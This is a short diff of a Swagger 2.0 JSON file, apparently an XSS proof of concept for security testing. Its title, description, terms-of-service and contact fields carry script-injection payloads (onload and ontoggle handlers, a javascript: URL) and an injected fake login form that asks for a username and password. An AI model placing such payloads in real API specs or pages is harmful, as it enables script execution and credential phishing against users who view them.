@@ -2,7 +2,7 @@
   "swagger": "2.0",
   "info": {
     "title": "Swagger <body onload=alert(1)> Sample App",
-    "description": "Swagger XSS PoC <details open ontoggle=prompt(1)> #Please authenticate:<br><form target=https://example.com><br><input placeholder='username'><br><input placeholder='password' type='password'><br><input type=submit>",
+    "description": "Swagger XSS PoC <h1>Please authenticate</h1><br><form target=https://example.com><br><input placeholder='username'><br><input placeholder='password' type='password'><br><input type=submit>",
     "termsOfService": "javascript:alert(document.domain)",
     "contact": {
       "name": "API <svg onload=alert(1)> Support",
